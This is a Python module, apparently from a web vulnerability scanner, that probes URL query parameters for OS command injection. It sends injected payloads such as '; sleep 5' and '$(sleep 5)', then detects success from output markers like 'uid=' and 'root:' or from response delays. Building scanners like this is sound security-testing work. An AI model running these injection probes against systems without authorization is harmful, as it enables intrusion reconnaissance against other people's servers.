from __future__ import annotations

import asyncio
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp

from src.vuln import Finding
from src.util.wordlists import CMDI_PAYLOADS


def _inject(url, param, val):
    p = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [val]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


EVIDENCE_PATTERNS = [
    "uid=", "gid=", "root:", "daemon:", "www-data",
    "bin/", "sbin/", "WINDOWS", "System32",
]

SLEEP_PAYLOADS = [
    ("; sleep 5", 5),
    ("| sleep 5", 5),
    ("`sleep 5`", 5),
    ("$(sleep 5)", 5),
    ("& ping -c 5 127.0.0.1", 4),
]


async def scan_cmdi(session, url, concurrency=10):
    params = parse_qs(urlparse(url).query, keep_blank_values=True)
    if not params:
        return []
    sem = asyncio.Semaphore(concurrency)
    findings = []

    async def _test_output(param, payload):
        injected = _inject(url, param, payload)
        async with sem:
            try:
                async with session.get(injected, ssl=False) as resp:
                    body = await resp.text(errors="replace")
                    for ev in EVIDENCE_PATTERNS:
                        if ev in body:
                            return Finding(
                                vuln_type="cmdi", severity="critical", url=injected,
                                parameter=param, payload=payload, evidence=f"'{ev}' in response",
                                description="OS Command Injection — command output in response",
                            )
            except (aiohttp.ClientError, asyncio.TimeoutError):
                pass

    async def _test_blind(param, payload, delay):
        injected = _inject(url, param, payload)
        async with sem:
            try:
                t0 = time.monotonic()
                async with session.get(injected, ssl=False) as _:
                    pass
                elapsed = time.monotonic() - t0
                if elapsed >= delay - 1:
                    return Finding(
                        vuln_type="cmdi-blind", severity="high", url=injected,
                        parameter=param, payload=payload,
                        evidence=f"response delayed {elapsed:.1f}s",
                        description="Blind Command Injection — time-based detection",
                    )
            except asyncio.TimeoutError:
                return Finding(
                    vuln_type="cmdi-blind", severity="medium", url=injected,
                    parameter=param, payload=payload, evidence="request timed out",
                    description="Possible blind command injection (timeout)",
                )
            except aiohttp.ClientError:
                pass

    for param in params:
        for payload in CMDI_PAYLOADS[:8]:
            r = await _test_output(param, payload)
            if r:
                findings.append(r)
                break

        if not any(f.parameter == param for f in findings):
            for payload, delay in SLEEP_PAYLOADS[:2]:
                r = await _test_blind(param, payload, delay)
                if r:
                    findings.append(r)
                    break

    return findings
